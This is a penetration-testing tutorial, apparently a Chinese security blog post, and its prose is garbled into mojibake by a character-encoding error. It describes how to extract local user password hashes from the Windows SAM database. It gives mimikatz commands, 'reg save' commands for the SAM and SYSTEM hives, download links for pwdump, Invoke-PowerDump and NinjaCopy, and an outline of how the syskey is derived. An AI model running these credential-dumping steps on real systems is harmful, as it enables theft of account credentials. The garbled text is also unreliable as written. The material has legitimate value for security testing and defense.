I"”<h2 id="0x00-å‰è¨€">0x00 å‰è¨€</h2>
<hr />

<p>åœ¨æ¸—é€æµ‹è¯•ä¸­ï¼Œè·å¾—äº†Windowsç³»ç»Ÿçš„è®¿é—®æƒé™åï¼Œé€šå¸¸ä¼šä½¿ç”¨mimikatzçš„<code class="language-plaintext highlighter-rouge">sekurlsa::logonpasswords</code>å‘½ä»¤å°è¯•è¯»å–è¿›ç¨‹lsassçš„ä¿¡æ¯æ¥è·å–å½“å‰ç™»å½•ç”¨æˆ·çš„å¯†ç ä¿¡æ¯ï¼Œä½†æƒ³è¦å…¨é¢è·å–ç³»ç»Ÿä¸­çš„å¯†ç ä¿¡æ¯ï¼Œè¿˜è¦å¯¹SAMæ•°æ®åº“ä¸­ä¿å­˜çš„ä¿¡æ¯è¿›è¡Œæå–ï¼Œå¯¼å‡ºå½“å‰ç³»ç»Ÿä¸­æ‰€æœ‰æœ¬åœ°ç”¨æˆ·çš„hashã€‚</p>

<h2 id="0x01-ç®€ä»‹">0x01 ç®€ä»‹</h2>
<hr />

<p>æœ¬æ–‡å°†è¦ä»‹ç»ä»¥ä¸‹å†…å®¹ï¼š</p>

<ul>
  <li>é€šè¿‡SAMæ•°æ®åº“è·å¾—ç”¨æˆ·hashçš„å¤šç§æ–¹æ³•</li>
  <li>åŸç†åˆ†æ</li>
</ul>

<h2 id="0x02-é€šè¿‡samæ•°æ®åº“è·å¾—ç”¨æˆ·hashçš„æ–¹æ³•">0x02 é€šè¿‡SAMæ•°æ®åº“è·å¾—ç”¨æˆ·hashçš„æ–¹æ³•</h2>
<hr />

<h3 id="1åœ¨çº¿è¯»å–samæ•°æ®åº“">1ã€åœ¨çº¿è¯»å–SAMæ•°æ®åº“</h3>

<p>è¯»å–å½“å‰ç³»ç»Ÿçš„SAMæ•°æ®åº“æ–‡ä»¶ï¼Œè·å¾—ç³»ç»Ÿæ‰€æœ‰æœ¬åœ°ç”¨æˆ·çš„hash</p>

<h4 id="1-mimikatz">(1) mimikatz</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>privilege::debug
token::elevate
lsadump::sam
</code></pre></div></div>

<p>æµ‹è¯•å¦‚ä¸‹å›¾</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-8/2-1.png" alt="Alt text" /></p>

<h4 id="2-pwdump7">(2) pwdump7</h4>

<p>ä¸‹è½½åœ°å€ï¼š</p>

<p>http://passwords.openwall.net/b/pwdump/pwdump7.zip</p>

<p>ç®¡ç†å‘˜æƒé™æ‰§è¡Œï¼Œå¦‚ä¸‹å›¾</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-8/2-2.png" alt="Alt text" /></p>

<h4 id="3-powershell">(3) powershell</h4>

<p>ä¸‹è½½åœ°å€ï¼š</p>

<p>https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-PowerDump.ps1</p>

<p>ç®¡ç†å‘˜æƒé™æ‰§è¡Œï¼Œæµ‹è¯•å¦‚ä¸‹å›¾</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-8/2-3.png" alt="Alt text" /></p>

<h3 id="2ç¦»çº¿è¯»å–samæ•°æ®åº“">2ã€ç¦»çº¿è¯»å–SAMæ•°æ®åº“</h3>

<p>è·å–å½“å‰ç³»ç»Ÿçš„SAMæ•°æ®åº“æ–‡ä»¶ï¼Œåœ¨å¦ä¸€ç³»ç»Ÿä¸‹è¿›è¡Œè¯»å–</p>

<p>å¯¼å‡ºSAMæ•°æ®åº“æ–‡ä»¶æœ‰ä»¥ä¸‹ä¸¤ç§å®ç°æ–¹æ³•ï¼š</p>

<h4 id="1-ä¿å­˜æ³¨å†Œè¡¨">(1) ä¿å­˜æ³¨å†Œè¡¨</h4>

<p>ç®¡ç†å‘˜æƒé™</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reg save HKLM\SYSTEM SystemBkup.hiv
reg save HKLM\SAM SamBkup.hiv
</code></pre></div></div>

<h4 id="2-å¤åˆ¶æ–‡ä»¶">(2) å¤åˆ¶æ–‡ä»¶</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Windows\System32\config\SYSTEM
C:\Windows\System32\config\SAM
</code></pre></div></div>

<p>é»˜è®¤æ— æ³•è¢«å¤åˆ¶ï¼Œå¦‚ä¸‹å›¾</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-8/2-4.png" alt="Alt text" /></p>

<p>éœ€è¦å€ŸåŠ©NinjaCopyï¼Œä½œè€…Joe Bialekï¼Œå‚è€ƒä¸‹è½½åœ°å€ï¼š</p>

<p>https://github.com/3gstudent/NinjaCopy</p>

<p>å¯¼å‡ºSAMæ•°æ®åº“æ–‡ä»¶åï¼Œåœ¨å¦ä¸€ç³»ç»Ÿï¼Œå¯é€šè¿‡ä»¥ä¸‹æ–¹å¼å¯¼å‡ºç”¨æˆ·hashï¼š</p>

<h4 id="1-mimikatz-1">(1) mimikatz</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>lsadump::sam /sam:SamBkup.hiv /system:SystemBkup.hiv
</code></pre></div></div>

<p>å¦‚ä¸‹å›¾</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-8/3-1.png" alt="Alt text" /></p>

<p><strong>æ³¨ï¼š</strong></p>

<p>mimikatzçš„å®˜æ–¹è¯´æ˜æœ‰é—®é¢˜ï¼Œåœ°å€å¦‚ä¸‹ï¼š</p>

<p>https://github.com/gentilkiwi/mimikatz/wiki/module-~-lsadump</p>

<p>å¯¼å‡ºå‘½ä»¤ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>lsadump::sam SystemBkup.hiv SamBkup.hiv
</code></pre></div></div>

<p>ä¼šæŠ¥é”™ï¼Œå¦‚ä¸‹å›¾</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-8/3-2.png" alt="Alt text" /></p>

<p>å¯ç”¨çš„å‘½ä»¤ç”±@æˆ‘çˆ±è¿™ä¸ªä¸–ç•Œæä¾›</p>

<h3 id="è¡¥å……">è¡¥å……ï¼š</h3>

<p>ä»¥ä¸‹å·¥å…·åœ¨è¯»å–Win7ç³»ç»Ÿçš„SAMæ•°æ®åº“æ–‡ä»¶ä¼šæŠ¥é”™</p>

<h4 id="1-pwdump7">(1) Pwdump7</h4>

<p>å¦‚ä¸‹å›¾</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-8/3-3.png" alt="Alt text" /></p>

<h4 id="2-pwdump5">(2) Pwdump5</h4>

<p>ä¸‹è½½åœ°å€ï¼š</p>

<p>http://passwords.openwall.net/b/pwdump/pwdump5.zip</p>

<p>è¯»å–ç»“æœä¸æ­£ç¡®ï¼Œå¦‚ä¸‹å›¾</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-8/3-4.png" alt="Alt text" /></p>

<h4 id="3-cain">(3) cain</h4>

<p>æµ‹è¯•å¦‚ä¸‹å›¾</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-8/3-5.png" alt="Alt text" /></p>

<h2 id="0x03-åŸç†åˆ†æ">0x03 åŸç†åˆ†æ</h2>
<hr />

<h3 id="1è¯»å–hklmsystemè·å¾—syskey">1ã€è¯»å–HKLM\SYSTEMï¼Œè·å¾—syskey</h3>

<p>è¯»å–æ³¨å†Œè¡¨é¡¹<code class="language-plaintext highlighter-rouge">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa</code>ä¸‹çš„é”®å€¼<code class="language-plaintext highlighter-rouge">JD</code>ã€<code class="language-plaintext highlighter-rouge">Skew1</code>ã€<code class="language-plaintext highlighter-rouge">GBG</code>å’Œ<code class="language-plaintext highlighter-rouge">Data</code>ä¸­çš„å†…å®¹ï¼Œæ‹¼æ¥æˆsyskey</p>

<p>ä»£ç å¯å‚è€ƒï¼š</p>

<p>https://github.com/johannwmeyer/quarkspwdump/blob/a68aa6330f37eb8d00055c73e6a4e3cb52bcdd6d/src/crypt.cpp#L222</p>

<p>https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/kuhl_m_lsadump.c#L219</p>

<p>å®Œæ•´è®¡ç®—ä»£ç å¯å‚è€ƒï¼š</p>

<p>https://raw.githubusercontent.com/3gstudent/Writeup/master/getsyskey.cpp</p>

<p>(Steal from http://www.zcgonvh.com/post/ntds_dit_pwd_dumper.html)</p>

<h3 id="2ä½¿ç”¨syskeyè§£å¯†hklmsam">2ã€ä½¿ç”¨syskeyè§£å¯†HKLM\SAM</h3>

<p>è¯»å–æ³¨å†Œè¡¨é¡¹<code class="language-plaintext highlighter-rouge">HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users</code>ä¸‹æ¯ä¸ªç”¨æˆ·ä¸­Fé¡¹å’ŒVé¡¹çš„å†…å®¹ï¼Œä½¿ç”¨syskeyè¿›è¡Œä¸€ç³»åˆ—çš„è§£å¯†</p>

<p>è¯¦ç»†è§£å¯†è¿‡ç¨‹å¯å‚è€ƒå¦‚ä¸‹é“¾æ¥ï¼š</p>

<p>http://www.xfocus.net/articles/200306/550.html</p>

<p>ç»¼ä¸Šï¼Œæƒ³è¦é€šè¿‡SAMæ•°æ®åº“è·å¾—ç”¨æˆ·hashï¼Œéœ€è¦è·å¾—ä¸¤ä¸ªæ–‡ä»¶ï¼šHKLM\SYSTEMå’ŒHKLM\SAM</p>

<p>æœ€ç›´æ¥çš„å¯¼å‡ºæ–¹å¼æ˜¯è¯»å–å½“å‰ç³»ç»Ÿä¸‹çš„æ³¨å†Œè¡¨HKLM\SYSTEMå’ŒHKLM\SAMï¼Œä½†éœ€è¦è·å¾—systemæƒé™</p>

<p>ä»adminåˆ‡æ¢åˆ°systemæƒé™çš„æ–¹æ³•å¯å‚è€ƒä¹‹å‰çš„æ–‡ç« ï¼š<a href="https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E4%BB%8EAdmin%E6%9D%83%E9%99%90%E5%88%87%E6%8D%A2%E5%88%B0System%E6%9D%83%E9%99%90">ã€Šæ¸—é€æŠ€å·§â€”â€”ä»Adminæƒé™åˆ‡æ¢åˆ°Systemæƒé™ã€‹</a></p>

<h2 id="0x04-å°èŠ‚">0x04 å°èŠ‚</h2>
<hr />

<p>æœ¬æ–‡ä»‹ç»äº†é€šè¿‡SAMæ•°æ®åº“è·å¾—æ‰€æœ‰ç”¨æˆ·hashçš„å¤šç§æ–¹æ³•ï¼Œå…³é”®åœ¨äºè¯»å–HKLM\SYSTEMå’ŒHKLM\SAM</p>

<hr />

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>

:ET